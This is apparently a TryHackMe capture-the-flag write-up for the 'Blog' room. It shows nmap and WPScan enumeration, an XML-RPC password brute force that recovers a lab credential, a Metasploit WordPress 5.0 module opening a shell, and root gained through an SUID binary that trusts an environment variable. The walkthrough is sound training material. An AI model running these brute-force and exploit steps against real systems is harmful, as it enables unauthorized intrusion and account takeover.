# TryHackMe Blog writeup 

---

## Nmap Scan

```
nmap -sCV -Pn 10.112.138.103
```

```ruby
Nmap scan report for 10.112.138.103
Host is up (0.097s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-03-25T12:54:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-03-25T12:54:27+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.88 seconds
                                                                  
```

----

## WP-Scan

```
wpscan --url http://blog.thm --enumerate p
```

<img width="709" height="142" alt="image" src="https://github.com/user-attachments/assets/35229e4b-ddea-455c-903a-015c103119c4" />

## when i try to open **`/wp-admin`** it requir login ofcourse

```
http://blog.thm/wp-login.php
```

> ## but i notice important thing when write wrong username it say `invalid username.`

<img width="766" height="527" alt="image" src="https://github.com/user-attachments/assets/1e2b0319-fbcf-4e06-84db-7f33c48380ef" />

## so i will try to enumrate some usernames useing wp-scan 

```
wpscan --url http://blog.thm --enumerate u
```

<img width="761" height="566" alt="image" src="https://github.com/user-attachments/assets/c44d9c41-c90a-4eb2-9929-13ac659fd61f" />

## good since we found aslo **`XML-RPC`** enabled so we can burte force password fast

<img width="699" height="162" alt="image" src="https://github.com/user-attachments/assets/c92cacd4-7b95-4b18-9fca-308a423088c6" />

## now let's bute force password of **`kwheel,bjoel`** 

```
wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

<img width="1027" height="125" alt="image" src="https://github.com/user-attachments/assets/0074800c-3830-441e-9550-deccd0275803" />

```
kwheel / cutiepie1
```

<img width="1919" height="553" alt="image" src="https://github.com/user-attachments/assets/fb8b3e2e-3741-424b-a7dc-13e16bf72b11" />

## done now we want to find way to get rce or shell on system 

> ## i found in wapplizer that wordpress version is 

```
wordpress 5.0
```

## let's search for vulns or CVE'S  IN it 

```
searchsploit wordpress 5.0 
```

<img width="1461" height="258" alt="image" src="https://github.com/user-attachments/assets/ce8803e2-65bb-4ba8-81d5-39b3ceb8188d" />

## i try to use exploit code and i faild so i will try using metasploit 

```
msfconsole
search wordpress 5.0
use 0
set PASSWORD cutiepie1
set RHOSTS 10.112.138.103
set USERNAME kwheel
set LHOST tun0
run
```

<img width="738" height="550" alt="image" src="https://github.com/user-attachments/assets/3936c1c7-3902-4975-8b85-ff6cd7066019" />

<img width="741" height="366" alt="image" src="https://github.com/user-attachments/assets/9456c5dd-fc15-44ed-a818-0b51523952c8" />

## i try to find **user.txt** but that what i found

<img width="647" height="117" alt="image" src="https://github.com/user-attachments/assets/a747b066-975d-4c3c-8711-6bc69f02e4e7" />

## so let's try to do privlilage esclation first 

> ## i searched for **`SUID`** Permissions found tool **`/usr/sbin/checker`**

<img width="722" height="125" alt="image" src="https://github.com/user-attachments/assets/e8cee61f-e76f-4404-9ac3-2488caa6bb89" />

## let's run it to findout how it work

```
/usr/sbin/checker
```

<img width="551" height="79" alt="image" src="https://github.com/user-attachments/assets/2eee8b6a-e849-4a03-948d-88e9dc5f3429" />

## it say **` Not a admin `**

### Check if it's looking for a specific UID

```
# Run with strace to see what it's doing
strace /usr/sbin/checker 2>&1 | grep -i "admin\|uid\|gid"

# Try to run with ltrace if available
ltrace /usr/sbin/checker
```

<img width="755" height="265" alt="image" src="https://github.com/user-attachments/assets/c0950938-f7e7-46aa-8792-66009228d200" />

> # Perfect! The ltrace output reveals exactly what's happening. The binary is checking for an environment variable called admin. When it doesn't exist, it prints "Not an Admin".

```
export admin=1
/usr/sbin/checker
```

<img width="772" height="293" alt="image" src="https://github.com/user-attachments/assets/3d4c89e5-4d92-4355-aa86-6c20e72bb51f" />

## now try to find **`user.txt`**

```
find / -name user.txt
```

<img width="766" height="97" alt="image" src="https://github.com/user-attachments/assets/f524442b-e027-4940-bfe2-16a30ec29d22" />

<img width="759" height="88" alt="image" src="https://github.com/user-attachments/assets/690e8979-2bbd-465b-b62c-8e5efdc53ad6" />

## since we’ve already obtained the root privilege, then we can just access the root directory.

```
cat /root/root.txt
```

<img width="829" height="93" alt="image" src="https://github.com/user-attachments/assets/fc2f61b3-9a47-45f0-9c3f-f65b86cf7d90" />

![MGIF](https://github.com/user-attachments/assets/59ecd8fd-50c7-42d5-852d-07edf78d5c06)

